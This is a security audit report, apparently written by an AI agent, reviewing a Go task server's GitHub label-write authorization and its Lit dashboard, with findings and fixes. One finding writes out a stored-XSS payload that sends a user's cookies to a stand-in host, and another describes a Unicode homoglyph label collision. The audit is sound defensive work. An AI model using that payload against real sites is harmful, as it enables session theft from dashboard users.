# audit-194-r8 — independent security audit, #194 round 8

**Tree:** `/workspace`, branch `label-write-scope-r8`, HEAD `158c8ae963faa5eef032e0857ecbc40d6a7c681a` `[MEASURED]`
**Verdict: APPROVE.** Nothing in the round-8 change blocks merge. Two Medium findings and four Low
are recorded; **the one Medium that is exploitable today (M-2) is pre-existing and outside the
round-8 diff**, and I would not hold this merge for it.

The default hypothesis I was asked to try to confirm — *"the round-8 change is itself a round-9
defect"* — **I could not confirm.** I attacked it from five directions (below) and the new code
held on every one. That is a green control and I am recording it as such, not as a pass.

---

## 0. Environment note — the harness was broken and was repaired mid-audit

On entry, `/workspace/.git/objects/info/alternates` pointed at `/workspace/farmtable-194-combine-r7/.git/objects`,
which does not exist inside this namespace. `git count-objects -v` → **0 objects local**;
`git status`, `git log`, `git diff` all `fatal: bad object HEAD`. `git rev-parse HEAD` still worked
(it reads the ref file, not the object). The EM repaired it mid-turn. Post-repair, verified by me:

| check | result |
|---|---|
| `git fsck --connectivity-only` | exit 0 `[MEASURED]` |
| `HEAD` | `158c8ae963faa5eef032e0857ecbc40d6a7c681a` `[MEASURED]` |
| `git rev-list --count 1d4442f..HEAD` | 9 `[MEASURED]` |
| `git status --porcelain` | empty `[MEASURED]` |

**Two claims I was asked to re-measure, both now measured by me:**

- **`go build ./...` exits 0.** Measured **twice**: once while the object store was still broken,
  once after repair. Both exit 0, **no `-buildvcs=false` needed**. So test-194-r8's claim that the
  build requires that flag is contradicted in *both* states — the broken-`.git` theory does not
  rescue it either. Whatever that leg measured, it was not this tree.
- **`53edc46` → `158c8ae` is docs-only and a plain descendant.** `git diff --stat 53edc46 158c8ae`
  → `.design/project-log/label-write-scope-r8.md | 232 ++++`, one file, 232 insertions.
  `git rev-parse 158c8ae^` = `53edc46`; `git merge-base --is-ancestor 53edc46 158c8ae` → true.
  **Confirming the EM's claim, with my own measurement.** No rebase, no amend, no code delta.
  The dev report's verification at `53edc46` therefore covers all code at `158c8ae`.

---

## 1. The invariant, in my own words — and where it differs from the brief's

**The brief's version:** *"The server may write only the labels it priced. A caller-supplied label
operation must never cause a write outside the set the server's gate authorised."*

**Mine:**

> For every label write the server causes a third-party tracker to perform, there must exist an
> authorization decision that was evaluated **against a named snapshot of that issue**, and the
> write must be a subset — **by match key, not by string** — of the edit that decision priced
> against **that same snapshot**. Separately, no code path may write a **lifecycle-bearing** label
> at all unless the decision that authorised it priced a lifecycle transition, **whether or not the
> caller named the label**.

Two differences, and the brief instructed me to treat a difference as a finding.

**Difference 1 — the brief scopes the invariant to *caller-supplied* label operations. That is too
narrow, and round 8's own largest change exists because it is too narrow.** The priority and type
arms of `UpdateTask` (`passthrough.go:597-617`) write labels **generated inside the store**. The
caller names a priority or a type, never a label. Under the brief's wording those arms are out of
scope; in fact they were the round-8 escalation vector (an operator config key capturing
`ft:stage/duplicate`), and `assertStageWriteAllowed` is precisely the control for them. An auditor
who took the brief's invariant literally would have skipped MUST-3 entirely.

**Difference 2 — the brief's invariant is silent on *which state* the gate priced against.** "The
set the gate authorised" is not well-defined without naming a snapshot, and that ambiguity *is*
A-4: the round-6 write was inside the priced set **as a set of strings** and outside it **as an
effect**, because the store resolved it against the remote's state at write time rather than
against the snapshot the scope was charged against. `RestrictLabelWriteToSnapshot`'s whole reason
for existing is invisible in the brief's phrasing.

---

## 2. Baseline verification (predictions stated before measuring)

| check | predicted | measured | agrees with brief? |
|---|---|---|---|
| `go build ./...` | exit 0 | **exit 0** | yes |
| `go vet ./...` findings | 4 | **4** | yes |
| vet lines | 1782/1892/2100/2277 | **1782/1892/2100/2277** | yes |
| vet messages | all `assignment copies lock value to ephReq … contains sync.Mutex` | **all four identical, in `GetReadyTasks`/`GetBlockedTasks`/`GetCriticalPath`/`GetBottlenecks`** | yes |
| `go test ./...` quiet | exit 0 | **exit 0, 0 FAIL** | yes |

Messages checked, not just counted, as instructed. **This confirms the brief's baseline claim with
my own measurement** — the brief was right here.

**One tension with the brief, flagged rather than scored as an error.** My *first* full-suite run
(taken while two subagents were saturating the CPU) gave **exit 1, one FAIL:
`TestWatchTasks_NoInitial (5.01s) — watch_test.go:118: timed out waiting for event`.** Re-run
serially, `go test ./internal/server/ -run TestWatchTasks -count=3` → exit 0, and the clean
full-suite re-run → exit 0. So the brief's `[MEASURED-BY-dev-194-r8]` characterisation
(contention-dependent, 5.00–5.02s timeouts, pre-existing) reproduces on my machine at first
attempt without me trying. The brief's *headline* baseline line ("exit 0, zero FAIL lines") is
only true unloaded; the brief says so itself three lines later. Worth stating that the two lines
are in tension, because a reader who stops at the table will treat one red run as a regression.

---

## 3. Findings

### [MEDIUM] M-1 — `checkLifecycleKeyCollisions` uses the *writer's* oracle, not the *authorization* oracle, and misses every configured stage alias

- **Location:** `internal/platform/github/config.go:286-317` (specifically the `owned` map,
  `config.go:289-292`)
- **What it is.** The check builds its set of "this deployment's own lifecycle labels" from
  `StageToLabel` over `allStages` — i.e. only the spellings `pushPrefix + "stage/" + <stage>`. But
  the function that actually decides whether a label is a lifecycle assertion is
  `authorizationStage` (`terminal_label_stages.go:46-52`), which consults `m.labelToStage` — a map
  that **also contains every key from `github.labels.stages`**. Those two sets are not equal. A
  configured stage alias is fully authoritative and is invisible to the check.
- **Measured** (probe, since deleted; predictions written before running, all four matched):

  ```
  config: stages: {shipped: completed}   types: {shipped: feature}

  A1  cfg.Validate()                                 = <nil>          ← ACCEPTED
  A2  authorizationStage("ft:shipped")                = ("completed", true)   ← authoritative
  A3  TypeLabelSwap(["ft:shipped"], "bug")            = add [bug]  remove [ft:shipped]
  A4  assertStageWriteAllowed(..., forbidden)         = error         ← backstop fires
  A5  control: types:{ft:stage/completed: feature}    = rejected      ← generated spelling IS caught
  ```

  A5 is the positive control: the check works for the spelling it models and only for that one.
- **Why it is not exploitable today.** Round 8's `assertStageWriteAllowed` (A4) catches it
  structurally at `writeLabelSwap`, because *that* control does use `authorizationStage`. The
  belt-and-braces design the dev report describes is real and it is what saves this.
- **What it costs anyway.** (a) The operator gets **no startup diagnostic** for a config that is
  wrong in exactly the way the check was written to catch; instead every `UpdateTask(type=…)` and
  `UpdateTask(priority=…)` against an affected issue fails at runtime with an authorization error —
  an operator-triggered availability failure the check exists to prevent. (b) If a seventh label
  write path is ever added that does not route through `writeLabelSwap` — and `CloseTask` is
  already such a path (`passthrough.go:873-897`) — the only remaining layer is this incomplete one.
- **This contradicts a claim in dev-194-r8.** The report and the code comment both say **"THE
  ORACLE IS THE FUNCTIONS THEMSELVES, not a model of them"** and **"a check that mirrors F must BE
  F"**. For the *normalisation* side (`stripForMatch`) that is true. For the *ownership* side it is
  false: `F` here is `authorizationStage`, and the check does not call it. The dev's surviving
  mutant **M6c** ("a hardcoded `ft:stage/` literal passes every test; equivalent by construction")
  is the evidence for this and was read as reassurance. It *is* equivalent to `StageToLabel` — and
  neither is equivalent to the authorization oracle. This is the round's stated methodology failing
  inside the very function whose doc comment states it.
- **Recommendation** (one line, no new rule):

  ```go
  // config.go:289-292 — replace
  owned := make(map[string]task.Stage, len(allStages))
  for _, stage := range allStages {
      owned[m.stripForMatch(m.StageToLabel(stage))] = stage
  }
  // with the set authorizationStage actually honours:
  owned := make(map[string]task.Stage, len(m.labelToStage))
  for key, stage := range m.labelToStage {
      owned[key] = stage            // labelToStage keys are already stripForMatch-normalised
  }
  ```

  `m.labelToStage` is keyed by `stripForMatch` at build time (`labels.go:136,181`), so the keys are
  already in the right space and the generated spellings remain covered (`labels.go:135-137` seeds
  every default stage). This makes M6c a **killable** mutant rather than an equivalent one, which
  is the second reason to do it.

### [MEDIUM] M-2 — stored `javascript:` XSS via `pull_requests[].url`, rendered unescaped into `href` in the Lit dashboard

**Pre-existing. Outside the round-8 diff. Reported because the brief asked me to spend budget
outside its list and to treat dashboard rendering as in scope.**

- **Locations:**
  - ingress, unvalidated: `internal/server/server.go:922-928` → `store.PullRequestParam{URL: pr.GetUrl()}`
  - persisted verbatim: `internal/store/entstore.go:933-943` (`prs = append(prs, map[string]string{"url": pr.URL, …})`)
  - egress: `internal/server/convert.go:340-345` (`Url: pr["url"]`)
  - sink: `web/src/components/inspector/ft-inspector-code.ts:106` — `<a class="pr-link" href=${pr.url} …>`
- **Exploit path.** A token holding only `task:write` calls
  `UpdateTask(add_pull_requests=[{id:"#1", url:"javascript:fetch('//x/'+document.cookie)", status:OPEN}])`.
  A dashboard user opens the task inspector and clicks the PR link; the script runs in the
  dashboard origin, with that user's session.
- **Why the existing controls do not stop it.**
  - There is **no URL validation anywhere** in the Go path — `grep` for `url.Parse` / `Scheme` /
    `validateURL` across `internal/server/` and `internal/store/entstore.go` returns nothing `[MEASURED]`.
  - The proto *declares* `string url = 2 [(buf.validate.field).string.uri = true];`
    (`proto/farmtable.proto:265`), but **protovalidate is not enforced at runtime**: the only
    interceptor registered anywhere is `server.TokenAuthInterceptor`
    (`cmd/farmtable-server/main.go:124`; `grep -rn "protovalidate|NewValidator|ChainUnaryInterceptor"`
    finds no validator) `[MEASURED]`. The constraint is decorative.
  - Even if it were enforced, `uri = true` would **not** help: `javascript:alert(1)` is a
    well-formed URI under RFC 3986.
  - Lit does not sanitize `href` by default and no `setSanitizer` is configured anywhere in
    `web/src` `[MEASURED]`.
- **Recommendation.** Validate at the boundary, where the knowledge is cheapest:

  ```go
  // internal/server/server.go, before building PullRequestParam
  func validatePullRequestURL(raw string) error {
      u, err := url.Parse(raw)
      if err != nil {
          return status.Errorf(codes.InvalidArgument, "invalid pull_request url: %v", err)
      }
      if u.Scheme != "https" && u.Scheme != "http" {
          return status.Errorf(codes.InvalidArgument,
              "pull_request url scheme %q not allowed: use http or https", u.Scheme)
      }
      return nil
  }
  ```

  and mirror the pattern already used for the repo link in
  `web/src/components/ft-toolbar.ts:461-465` at the two unguarded `href` bindings
  (`ft-inspector-code.ts:106`, `ft-inspector-meta.ts:611`). Do both: the server check is the fix,
  the client check protects rows already in the database.

### [LOW] L-1 — `assertStageWriteAllowed` panics on a nil mapper; the sibling readers do not, and there is no recovery interceptor

- **Location:** `internal/platform/github/passthrough.go:290-313` → `terminal_label_stages.go:46-47`
  → `pushPrefix()` → `m.config.PushPrefix` on a nil `*LabelMapper`
- **Measured** (probe, predictions stated first, both matched):

  ```
  D3  s.assertStageWriteAllowed(nil, ["ft:stage/completed"], forbidden)  with s.mapper == nil
        → PANIC: runtime error: invalid memory address or nil pointer dereference
  D4  control, different axis: (*LabelMapper)(nil).AllTerminalLabelStages([...])
        → []   (no panic — the sibling reader guards `m == nil`)
  ```

  D4 is the positive control drawn from a different axis than the search: the two readers on the
  same predicate (`TerminalLabelStage:683`, `AllTerminalLabelStages:172`) both guard, and
  `LabelDeltaLifecycleStages` in the *same file* guards explicitly at `passthrough.go:1020`. The
  new authorization predicate is the one place that does not.
- **Exploitability.** Not reachable today: `NewPassThroughStore` always sets `mapper`
  (`passthrough.go:83`), and it is the only constructor. So this is a latent defect, not a live
  DoS. It matters because grpc-go does **not** recover from handler panics and no recovery
  interceptor is registered (`cmd/farmtable-server/main.go:124` installs `TokenAuthInterceptor`
  only) `[MEASURED]` — so if a future constructor, a test double promoted to production, or a
  zero-value store ever reaches it, the failure mode is **process death**, not a denial.
- **Recommendation:** `if m == nil { return "", false }` at the head of `authorizationStage`,
  matching `TerminalLabelStage` and `AllTerminalLabelStages`. Fail closed at the reader, so every
  caller inherits it, rather than adding a nil check at the one call site.

### [LOW] L-2 — `stageWritePolicy` is a bare named `bool`, so `writeLabelSwap(…, true)` compiles

- **Location:** `internal/platform/github/passthrough.go:261-279`
- **The brief's question was "if a future call site omits the argument, does it fail open or
  closed?" That question has no answer in Go** — the parameter is positional and omitting it is a
  compile error. The hazard it gestures at is real but different:

  ```
  D1  zero value == stageWriteForbidden        → true   (fails CLOSED — good)
  D2  var p stageWritePolicy = true; p == stageWriteAllowed → true
  ```

  `D2` is the finding: an untyped `true` literal is assignable to the named bool type, so a
  developer can write `s.writeLabelSwap(ctx, id, add, remove, true)` and get the **permissive**
  value without ever typing the word `stageWriteAllowed` — bypassing the "passing it asserts, it
  does not merely permit" contract the doc comment (`passthrough.go:264-265`) states. Grep-based
  review for `stageWriteAllowed` would miss such a call site.
- **Recommendation:** make the type unspellable by accident.
  ```go
  type stageWritePolicy struct{ allowed bool }
  var (
      stageWriteForbidden = stageWritePolicy{}          // zero value still fails closed
      stageWriteAllowed   = stageWritePolicy{allowed: true}
  )
  ```
  A struct literal `stageWritePolicy{true}` is still writable but is no longer something a
  developer types by reflex, and `true`/`false` no longer compile.

### [LOW] L-3 — the repo label index is cached for the process lifetime, so a priced label write can silently no-op and report success

- **Location:** `internal/platform/github/passthrough.go:146-152` (`if cached { return nil }` — the
  index is never invalidated) and `passthrough.go:331-334` (unresolvable names are dropped, not an
  error, deliberately)
- **What it means.** A label created on GitHub *after* the store's first `ensureLabelIndex` is
  never resolvable. `labelNamesToIDs` drops it, `writeLabelSwap` issues no mutation and
  **returns `nil`**, and `UpdateTask` reports the stage as moved. For the *gate* this fails closed
  (the caller over-paid), which is what the doc comment argues and it is correct. For the
  **integrity** claim round 8 makes for itself — "a write that says nothing about what it did not
  do" is the shape that kept A-4 invisible (`passthrough.go:318-324`) — this is that shape,
  surviving in the one place the round left alone.
- **Related dead config.** `LabelConfig.AutoCreateLabels` (`config.go:44-46`, defaulted `true` at
  `config.go:360`) documents "missing labels are created on GitHub during push". `grep -rn
  AutoCreateLabels --include='*.go'` returns **only the declaration and the default — zero
  readers** `[MEASURED]`. So the documented mitigation for the missing-label case does not exist.
- **Recommendation.** Either (a) refresh the index once on a resolution miss before concluding the
  label is absent, or (b) at minimum `log.Printf` when `len(names) > 0 && len(ids) < len(names)` in
  `labelNamesToIDs`, naming the dropped labels. And either implement `AutoCreateLabels` or delete
  the field — a config knob that silently does nothing is worse than an absent one.

### [LOW] L-4 — `strings.ToLower` is a simple case fold, so two distinct GitHub labels can collide in `labelIndex`

- **Location:** `internal/platform/github/passthrough.go:167` (`index[strings.ToLower(string(l.Name))] = l.ID`)
  and `passthrough.go:201` (lookup), plus `labelMatchKey` at `passthrough.go:1234`
- **Measured:**
  ```
  B1  labelMatchKey("ft:stage/duplİcate")  = "ft:stage/duplicate"    ← U+0130 folds to 'i'
      labelMatchKey("ft:stage/duplicate")  = "ft:stage/duplicate"    ← equal
  B2  authorizationStage("ft:stage/duplİcate") = ("duplicate", true)
  ```
- **Answering the brief's question directly:** no, `strings.ToLower` is not the right fold for a
  security-relevant identity comparison in general. **But the exposure here is narrower than it
  looks, and I want to be honest about that rather than inflate it:**
  - **B2 is *not* a forgery.** The prefix requirement's stated threat model
    (`terminal_label_stages.go:24-27`) already accepts that anyone who can apply a `ft:`-prefixed
    label is deliberately impersonating. An attacker who can apply `ft:stage/duplİcate` can apply
    `ft:stage/duplicate`. The homoglyph buys nothing.
  - **The real cost is the index collision.** GitHub's label-name uniqueness is case-insensitive
    over ASCII, so `ft:stage/duplicate` and `ft:stage/duplİcate` **can coexist in one repository**,
    and both index to the same key at `passthrough.go:167`. The map holds one entry, chosen by
    GitHub's label pagination order. A removal the gate priced for the real lifecycle label can
    then resolve to the decoy's node ID: the decoy is deleted, the lifecycle label survives, and
    `writeLabelSwap` returns success. Farm Table believes a terminal label was removed that was
    not. Requires label-creation rights on the repo.
  - **Zero-width characters and RTL overrides do *not* collide** — they survive `ToLower` and
    `TrimSpace` and produce distinct keys. Only Unicode simple-case-fold collisions do.
- **Recommendation.** Detect rather than normalise — normalising (NFKC, full case folding) would
  change which labels resolve and is a behaviour break. In `ensureLabelIndex`, refuse to overwrite
  an existing key and log the pair:
  ```go
  for _, l := range labels {
      k := strings.ToLower(string(l.Name))
      if _, dup := index[k]; dup {
          log.Printf("github passthrough: %s: labels collide under case folding at key %q; "+
              "label writes for that key are ambiguous", s.repoSlug(), k)
          continue // keep the first, deterministically
      }
      index[k] = l.ID
  }
  ```
  This is out of round-8 scope; file it as a follow-up.

### [INFO] I-1 — the round-8 restrictor *under*-removes when the snapshot carries two labels sharing a match key

- **Location:** `internal/platform/github/passthrough.go:1217-1225` (`removeSeen` dedups by key)
- Snapshot `["ft:stage/completed", "FT:STAGE/COMPLETED", "bug"]`, caller removes
  `["ft:stage/completed"]`: `applyLabelDelta` drops **both**, so the gate prices "no terminal label
  left" — but the emitted `remove` list contains only the first spelling, so one survives the write.
- **Direction of failure is safe** (the write does less than was priced, and the caller over-paid),
  and GitHub cannot actually hold two such labels. Recording it because it is the *only* asymmetry
  I found between `applyLabelDelta`'s prediction and the emitted edit, and because it is the exact
  input class the `removeKeys` safety belt was written for — the belt handles the *over*-removal
  direction and this is the other one.

### [INFO] I-2 — the CLI's GitHub pass-through mode registers the gRPC service with **no interceptor**, so every scope gate in #194 is inert on that path

- **Location:** `internal/cli/connect.go:301-306` (`grpc.NewServer` with only message-size options;
  no `TokenAuthInterceptor`), selected by `FARMTABLE_GITHUB_REPO` alone at `connect.go:120-123`
- `RequireScope` returns `nil` on its first line when `authEnforcedKey` is unset
  (`internal/server/scopes.go:74-78`), as does `RequireCollectionAccess` (`scopes.go:99-104`)
  `[MEASURED — read]`.
- **This is not a vulnerability.** The "caller" is the local user, who already holds the GitHub
  token the store authenticates with; they could use `gh` directly. There is no privilege boundary.
- **It is, however, a measurement hazard worth writing down for this workstream specifically.**
  Any end-to-end "control" run through `ft` in pass-through mode **cannot falsify a scope-gate
  defect**, because the gates are structurally inert on that path. What *does* still apply is
  `RestrictLabelWriteToSnapshot` (`server.go:885`, not scope-dependent) and `assertStageWriteAllowed`.
  Given that this round's methodology turns on "what can my oracle discriminate", a harness that
  routes through `connect.go:275` has an oracle that discriminates strictly less than the author
  would expect. I found no evidence that any round-8 measurement did this — I am flagging the trap,
  not a hit.

### [INFO] I-3 — residual risk of shape-only `req.Type` validation (answering brief §2(c))

**The dev's correction of the brief is CORRECT, and I verified it rather than accepting it:**
`internal/store/schema/task.go:36` reads exactly `field.String("type").Optional().Default("")`
`[MEASURED]`. An allow-list is genuinely not implementable server-side.

Residual risk of the shape-only check (`server.go:100-110`, non-blank + ≤128 runes):

- **On the GitHub path: closed.** `TypeLabelSwap` (`labels.go:502-510`) now returns `(nil, nil)`
  for an unrepresentable non-empty type, so no arbitrary caller string ever becomes a label name.
  I traced `TypeToLabel`: it only ever returns a value from `m.typeToLabel`, which is built from
  `defaultTypeLabels` and `cfg.Types` — both operator-controlled, never caller-controlled. **A
  caller cannot inject a label name through `req.Type`.** This is the important half and it holds.
- **On the native path: open, low.** The string is persisted verbatim and can contain control
  characters, `\r`, ANSI escape sequences, and RTL overrides. It reaches the terminal via the CLI
  (`ANSI/`\r` output spoofing), the process log, and gRPC error strings. It is safe in the
  dashboard (Lit text position, auto-escaped). 128 *runes* is also up to 512 bytes; there is no
  byte bound. Suggest rejecting `unicode.IsControl` runes — a one-line addition with no
  legitimate-use cost, since a task type containing a newline has none.

---

## 4. Regression check on what previous rounds fixed — **all clean, reported as required**

### A-4 (round 7) — still closed `[MEASURED]`

Probe against `RestrictLabelWriteToSnapshot` at HEAD, predictions written first, all matched:

```
C3  snapshot ["bug"], remove ["ft:stage/wont_fix"], add ["bug"]
      → add nil, remove nil          ← the free blind retryable primitive is gone
C4  snapshot ["bug"], add ["ft:stage/completed"], remove ["ft:stage/completed"]
      → add nil, remove nil          ← C-1's cross-list input nets to nothing
C1  snapshot ["FT:Stage/Completed","bug"], remove ["ft:stage/completed"]
      → remove ["FT:Stage/Completed"]  ← snapshot spelling, resolvable by labelNameToID
C5  snapshot ["bug"], add [" ft:stage/completed "]
      → add [" ft:stage/completed "]   ← caller spelling kept; write drops it, gate over-charged
                                          (fails closed, and documented at passthrough.go:1184-1188)
```

The call site is intact at `internal/server/server.go:885-892`, and I confirmed there is **no
earlier assignment to `p.AddLabels` / `p.RemoveLabels`** anywhere in `UpdateTask` — so the
`if len(...) > 0` guards at `:887,:890` cannot leave an un-narrowed value behind. That was my
leading candidate for a fail-open and it is not one.

### The derivation-not-mirroring claim (MUST 1) — holds, verified structurally

`RestrictLabelWriteToSnapshot` calls `applyLabelDelta` (`passthrough.go:1176`) and both loops
filter against its output. I checked the two directions the invariant needs:

- **adds ⊆ caller's `addLabels` (by key):** `after` ⊆ `current ∪ add`; every `current` entry has its
  key in `present` and is filtered out at `:1192`. ✓
- **removes ⊆ caller's `removeLabels` (by key):** the `removeKeys` belt at `:1220` makes this
  unconditional, independent of `applyLabelDelta`'s behaviour. ✓ This belt is doing more work than
  the comment claims — it is the *only* thing that makes the removal side unconditionally sound,
  not merely a hedge against duplicate keys.

I could not construct an input where the restrictor emits anything outside the priced set. **Green
control, recorded as a finding per the brief's rule.**

### Error propagation (MUST 3/4) — the guard is not one a caller can drop `[MEASURED — read]`

All six `writeLabelSwap` call sites return the error to their caller:
`passthrough.go:583, 603, 614, 628, 636` (all `return nil, err` inside `UpdateTask`) and `:777`
(`ClaimTask`). `assertStageWriteAllowed` runs at `:339`, **before** any `gql` call, so a refusal
prevents the write on every arm rather than reporting after the fact. There is no
`_ = s.writeLabelSwap(...)` anywhere. The brief's "a guard that returns an error the caller drops
is not a guard" does not apply here.

`CloseTask` (`passthrough.go:873-897`) genuinely does *not* route through `writeLabelSwap` and
swallows its mutation errors into `log.Printf` by design. That is correct — it requires
`task:close`, its labels are store-generated by `StageLabelSwap`, and it must not fail an
already-completed close. **The dev report was right and the round-8 brief was wrong about this**
(it listed `CloseTask` as a `stageWriteAllowed` call site).

### The dashboard XSS — **the brief's premise here is wrong; see §5.1**

The control that matters is present and correct at HEAD: both `unsafeHTML` sinks in the frontend
(`web/src/components/inspector/ft-inspector-desc.ts:233`,
`web/src/components/inspector/ft-inspector-comments.ts:221`) route through the single sanitizer
`DOMPurify.sanitize(marked.parse(md))` at `web/src/util/markdown.ts:5`. Zero occurrences of
`innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `new Function`,
`unsafeSVG`, or `unsafeStatic` anywhere under `web/` `[MEASURED]`. Label names, task titles and
server error strings all render in escaped positions (errors via `document.createTextNode`).

Two caveats:
1. **The sanitizer has no test in this tree.** `find web -name '*.test.ts'` returns exactly one
   file, `web/src/utils/task-ready.test.ts` `[MEASURED]`. `git log --all -- web/src/util/markdown.test.ts`
   is **empty** — no such test ever existed in this repository. The control is unpinned.
2. `href` bindings are the residual gap — see M-2.

---

## 5. Every place this brief was wrong — required deliverable

### 5.1 — "This workstream has already shipped one HIGH-severity XSS that a parallel audit caught and a code review missed" (§2(d)), and §3's "Earlier rounds on this branch closed A-4 **and an XSS in the dashboard**"

**Wrong for this branch and this repository.** Measured:

- `git log --oneline 1d4442f..HEAD -- web/` → **empty**. Zero frontend commits in round 8's range.
- `git log --oneline -3 -- web/src/util/markdown.ts` → last touched at `7a218bd`, the commit that
  *introduced* the inspector. DOMPurify was present from the initial scaffold, not added as a
  remediation.
- `grep -rin "xss|cross-site" .design/ docs/` → one unrelated hit in
  `.design/integration-research/asana.md`. **No XSS finding is logged anywhere in this repo.**
- The XSS work is on **#195** (a markdown-sanitizer workstream), evidenced by
  `/scion-volumes/scratchpad/projects/farmtable/salvage/audit-195-r5-poc-output.txt`,
  `.../salvage/review-195-r5/markdown.test.ts.HEAD-53296af`, `.../salvage/test-195-r5/probe-sanitizer.mjs`.
  That workstream's `markdown.test.ts` exists **in the scratchpad only**; it has never been in this
  repository's history.

**Consequence for the brief's own instructions:** §3 asks me to "confirm [the XSS] is still closed"
at `158c8ae`. There is no closure event on this branch to regress *from*. I answered the question
the brief meant instead (is the sanitizer sound at HEAD — yes) and surfaced the fact that the
#195 test pin is absent here.

### 5.2 — §2(b): "if a future call site omits the argument, does it fail open or closed?"

**The premise is not expressible in Go.** `writeLabelSwap`'s policy parameter is positional;
omitting it is a compile error, not a fail-open. The brief's question presumes a variadic or
optional parameter that does not exist. The zero value *is* `stageWriteForbidden` and *does* fail
closed (`D1`, measured), so the reassurance the brief was fishing for is warranted — but for a
different reason than the one it asked about, and the actual hazard in that area (an untyped `true`
literal, `D2`) is one the question would never have surfaced. See L-2.

### 5.3 — §1: "Round 8's fix for C-1 is substantially larger than the fix it replaces: **nine commits**, a new policy parameter threaded through six call sites…"

**Miscounted, and the attribution is wrong.** `1d4442f..HEAD` is nine commits, but the **fix for
C-1 is one commit**, `f6b3f31`. The other eight are independent work items (MUST 3, MUST 4, SHOULD
5–8) plus one docs-only commit (`158c8ae`, +232 lines of project log, zero code). Attributing all
nine to the C-1 fix inflates the premise the brief then asks me to treat as the default hypothesis.
The correct framing — and the one I audited — is that *the round* is nine commits and the C-1 fix
is one of them; the new attack surface is overwhelmingly in items 3, 5, 6 and 7, not in the C-1
rewrite. As it happens the C-1 rewrite is the cleanest thing in the round, and the two Mediums are
in item 6 and in code the round did not touch at all.

### 5.4 — §2(a) under-describes the normalisation hazard it names

The brief's factual claim is **correct and I confirm it with my own read**: `labelNameToID` resolves
via `s.labelIndex[strings.ToLower(name)]` (`passthrough.go:201`) and the index is built with
`index[strings.ToLower(string(l.Name))]` (`passthrough.go:167`) — **no `TrimSpace` on either side**.
The dev's reasoning for emitting the snapshot spelling follows and is sound.

But the brief frames whitespace as *the* defect and treats the fold itself as sound ("is
`strings.ToLower` the right fold" is posed only about the *snapshot's adversarial content*). The
sharper statement is that the **index is keyed by a lossy function of the label name**, and
whitespace is only the most obvious way two names can share a key. `strings.ToLower` is a simple
case fold: U+0130 → `i` (measured), so two labels GitHub considers distinct occupy one index slot.
That is L-4, and it is a property of the index rather than of the caller's spelling. Adding
`TrimSpace` to `labelNameToID` — the fix the brief's framing suggests — would not touch it.

### 5.5 — Baseline tension (not an error, flagged for the record)

"`go test ./...` → exit 0, zero FAIL lines" and "`TestWatchTasks*` is genuinely flaky under CPU
contention … 4 of 6 batches RED" are both in the brief's known-good baseline, three lines apart.
They are not contradictory but they read as one guarantee, and my first full-suite run — under
ordinary subagent load, not a deliberate stress — went red on exactly that test. A reader who
stops at the table will misclassify it. Suggest the baseline state the loaded and unloaded results
as one row each.

### 5.6 — Things in the brief I checked and found CORRECT

Recording these so the ledger is not hits-only:

- Baseline `go build` exit 0; `go vet` exit 1 with exactly 4 copylocks findings at
  1782/1892/2100/2277, messages and function names as stated. **Confirming the brief's claim with
  my own measurement.**
- §2(a)'s `strings.ToLower` / no-`TrimSpace` claim about `labelNameToID` and `labelIndex` — correct
  (see 5.4 for what it under-states).
- §2(c)'s instruction to verify the dev's Ent claim — the dev is right;
  `field.String("type").Optional().Default("")` at `internal/store/schema/task.go:36`.
- §2(d)'s worry about `ConfigSource` reaching a client — **checked and clean.** `Describe` has
  exactly one caller (`cmd/farmtable-server/main.go:89`, `log.Println`); `LoadConfigWithSource` has
  exactly one (`main.go:83`, error → `log.Fatalf` before the server serves); the three
  `AbsolutePath`-bearing errors (`config.go:135,141,145`) reach only that `log.Fatalf`.
  `internal/server/`, `internal/serverapp/` and `internal/mcp/` contain **zero** references to
  `LoadConfig`, `ConfigSource`, `Describe(`, `AbsolutePath` or `DefaultConfigPath`. The config
  crosses the boundary only as a parsed `*GitHubConfig` via `NewPlatformResolver`. The CLI's one
  `LoadConfig` call discards the error (`internal/cli/connect.go:292-297`). **No information
  disclosure. The brief's hypothesis was reasonable and the answer is negative.**
- The `stageWritePolicy` zero value fails **closed** (D1).
- A-4 and C-1 are both still closed at `158c8ae` (§4).

---

## 6. What I attacked and could not break — green controls, recorded

The brief told me to treat "round 8 is itself a round-9 defect" as the default hypothesis. Five
attempts, all negative:

1. **Restrictor widening.** Can `RestrictLabelWriteToSnapshot` emit anything outside the priced
   edit? No — proved structurally (both loops filter against `applyLabelDelta`'s output; the
   `removeKeys` belt bounds the remove side unconditionally) and probed on five inputs including
   the C-1 cross-list input and a duplicate-match-key snapshot.
2. **Narrowing fail-open at the call site.** Does `if len(addLabels) > 0` at `server.go:887` leave
   an earlier un-narrowed assignment in place? No — `p.AddLabels`/`p.RemoveLabels` are assigned
   nowhere else in `UpdateTask` (`grep` over the whole repo: only `:888` and `:891`).
3. **Routing split between the gate and the write.** The gate and restrictor dispatch on
   `storeForCtx(ctx, t.CollectionID)` (`multistore.go:285,303`) while `MultiStore.UpdateTask`
   dispatches on `storeForTask(ctx, id)` (`multistore.go:221`) — but `storeForTask` resolves to
   `storeForCtx(ctx, t.CollectionID)` for the same task (`multistore.go:171,185`), so the two
   cannot diverge. `MultiStore.RestrictLabelWriteToSnapshot` fails open for a non-implementing
   store (`multistore.go:304-306`), which is correct: EntStore's stage is a column.
4. **An ungated route to a label write.** Enumerated all eight sinks and every entry point (gRPC,
   MCP, CLI, grpc-web, import, graph routing, sync adapters). Every reachable path is priced:
   `UpdateTask` by the 840-892 gate, `CreateTask` by a separate gate at `server.go:198-216`,
   `ClaimTask` by `task:claim`, `CloseTask` by `task:close`. `ImportCollection` cannot reach GitHub
   (`multistore.go:451` routes to primary; `passthrough.go:1417` returns `ErrNotImplemented`).
   `InsertTasksAfter` rejects lifecycle labels outright and is `ErrNotImplemented` on GitHub.
   The `SyncCollection` adapters (`github.go:94/100`, `beads.go:124/130`) have **no gate at all**
   but also **zero non-test callers** — dead code. Flag them if anyone wires them up.
5. **Unicode/normalisation bypass of the ownership predicate.** Case-fold collisions reach
   `authorizationStage` but do not *forge* anything the prefix requirement was not already
   accepting; zero-width and RTL characters produce distinct keys and do not collide. The residual
   is the index-collision integrity issue (L-4), not an authorization bypass.

---

## 7. Verdict

**APPROVE. Nothing blocks merge.**

- The round-8 change is sound on its primary axis. The derive-don't-mirror rewrite of
  `RestrictLabelWriteToSnapshot` is the right construction and I could not break it.
  `assertStageWriteAllowed` is a real control that fails closed, cannot be dropped by a caller, and
  demonstrably catches a config-capture case its sibling config check misses.
